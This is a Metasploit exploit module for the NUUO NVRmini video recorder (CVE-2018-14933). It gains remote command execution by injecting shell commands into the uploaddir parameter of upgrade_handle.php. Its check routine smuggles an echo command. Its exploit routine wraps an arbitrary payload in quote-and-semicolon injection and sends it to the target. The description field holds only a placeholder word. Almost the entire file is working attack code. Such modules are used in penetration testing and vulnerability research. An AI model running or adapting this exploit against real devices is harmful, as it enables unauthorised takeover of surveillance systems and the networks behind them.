##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'NUUO NVRmini - upgrade_handle.php Remote Command Execution',
      'Description'    => %q{
        Aciklamasi
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Berk Düşünür <@berkdusunur>', 
          'numan turle <@numanturle>' 
        ],
      'References'     =>
        [
          ['URL', 'https://www.berkdusunur.net/2018/11/development-of-metasploit-module-after.html'],
          ['CVE', '2018-14933'],
          ['EDB', '45070']
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Platform'       => %w{ unix win },
      'Arch'           => ARCH_CMD,
      'Targets'        => [ ['NUUO NVRmini', { }], ],
      'DisclosureDate' => 'Jul 23 2018',
      'DefaultTarget'  => 0))

  end

  def check
    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path.to_s, "upgrade_handle.php"),
      'vars_get'        =>
        {
          'cmd' => 'writeuploaddir',
          'uploaddir' => "';echo '#{Rex::Text.rand_text_alphanumeric(10..15)}';'"
        }
    })
    if res.code == 200 and res.body =~ /upload_tmp_dir/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def http_send_command(cmd)
    uri = normalize_uri(target_uri.path.to_s, "upgrade_handle.php")
    res = send_request_cgi({
      'method'  => 'GET',
      'uri'             => uri,
      'vars_get'        =>
        {
          'cmd' => 'writeuploaddir',
          'uploaddir' => "';"+cmd+";'"
        }
    })
    unless res
      fail_with(Failure::Unknown, 'Failed to execute the command.')
    end
    res
  end

  def exploit
    http_send_command(payload.encoded)
  end
end
